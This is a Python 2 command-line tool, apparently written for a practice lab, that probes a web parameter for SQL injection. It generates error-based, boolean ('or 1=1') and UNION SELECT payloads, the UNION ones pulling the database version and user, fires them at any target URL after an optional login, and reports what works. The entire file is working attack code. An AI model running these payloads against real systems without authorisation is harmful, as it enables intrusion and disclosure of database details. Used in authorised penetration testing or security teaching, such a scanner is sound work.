#!/usr/bin/env python

from functools import partial
from itertools import product
from urllib import urlencode
import argparse
import json
import re
import urlparse

import requests


def sql_inject(request_session, config, injection_param, sql):
    url_components = list(urlparse.urlparse(config['endpoint']))
    query = dict(urlparse.parse_qsl(url_components[4]))
    query.update(config['required_params'])
    query.update({injection_param: sql})  # inject into target param
    url_components[4] = urlencode(query)
    url_injected = urlparse.urlunparse(url_components)
    return request_session.get(url_injected, cookies=config['cookies'])


def check_error(sqli_output):
    # TODO: Expand for other RDBMS
    db_errors = {
        'mysql': 'You have an error in your SQL syntax.*MySQL',
        'other': 'Error'
    }
    for db, error_msg in db_errors.items():
        m = re.search(error_msg, sqli_output.text, flags=re.IGNORECASE)
        if m:
            error = {'db': db, 'error_msg': m.group(0)}
            # we've found something useful no need to continue checking
            return error


def check_union(default_output, sqli_output):
    p = re.compile('UNION INJECTION.*')
    m_default = p.search(default_output.text)
    m_sqli = p.search(sqli_output.text)
    if not m_default and m_sqli:
        return m_sqli.group(0)


def check_boolean(default_output, sqli_output):
    # naive check
    if default_output.text != sqli_output.text:
        return sqli_output.text


def union_strings():
    # TODO: Cater for other RDBMS
    max_cols = 20
    prefix = ['1', '\'', '"', '']
    suffix = ['', '#', '--']
    selects = [
        "concat('UNION INJECTION: ', @@version)",
        "concat('UNION INJECTION: ', user())"
    ]
    union_select = ['UNION SELECT']
    col_padding = [',0'*i for i in range(max_cols)]
    return [
        '{} {} {} {} {}'.format(*i)
        for i
        in product(
            prefix,
            union_select,
            selects,
            col_padding,
            suffix
        )
    ]


def boolean_strings():
    prefix = ['1', '', '"', '\'']
    suffix = ['', '#', '--']
    conditions = ['or 1=1', 'and 1=2']
    return [
        '{} {} {}'.format(*i)
        for i
        in product(
            prefix,
            conditions,
            suffix
        )
    ]


def error_strings():
    return ['\'', '"', '(', ')']


def print_results(type, injection_param, results, display_output=False):
    if results:
        print '{}: vulnerable to {} exploitation'.format(injection_param, type)
    if results and display_output:
        print results


def get_results(check, sql_inject_p, sqli):
    return filter(lambda x: x, map(check, map(sql_inject_p, sqli)))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Simple SQLi Vulnerability Scanner'
    )
    parser.add_argument('-l', '--login_url', help='Login URL')
    parser.add_argument(
        '-ld',
        '--login_data',
        help='Login fields as JSON string'
        'e.g. \'{"username": "foo", "password": "bar"}\''
    )
    parser.add_argument(
        '-t',
        '--target',
        help='Target endpoint',
        required=True
    )
    parser.add_argument(
        '-ip',
        '--injection_param',
        help='Target param for SQL injection', required=True
    )
    parser.add_argument(
        '-rp',
        '--required_params',
        help='JSON formatted string for any required params'
        ' for target e.g. \'{"Submit": "Submit"}\''
    )
    parser.add_argument(
        '-c',
        '--cookies',
        help='Cookies as JSON string e.g. \'{"security": "low"}\''
    )
    pargs = parser.parse_args()
    request_session = requests.Session()
    if pargs.login_url:
        login = request_session.post(
            pargs.login_url,
            data=json.loads(pargs.login_data),
            cookies=json.loads(pargs.cookies if pargs.cookies else '{}')
        )
    config = {
        'endpoint': pargs.target,
        'required_params': json.loads(
            pargs.required_params if pargs.required_params else '{}'),
        'cookies': json.loads(pargs.cookies if pargs.cookies else '{}')
    }
    sql_inject_p = partial(
        sql_inject, request_session, config, pargs.injection_param)
    # Error based
    print_results(
        'Error based',
        pargs.injection_param,
        get_results(check_error, sql_inject_p, error_strings())
    )
    # Union based
    check_union_p = partial(check_union, sql_inject_p(''))
    print_results(
        'Union based',
        pargs.injection_param,
        get_results(check_union_p, sql_inject_p, union_strings()),
        display_output=True
    )
    # Boolean based
    check_boolean_p = partial(check_boolean, sql_inject_p(1))
    print_results(
        'Boolean based',
        pargs.injection_param,
        get_results(check_boolean_p, sql_inject_p, boolean_strings())
    )
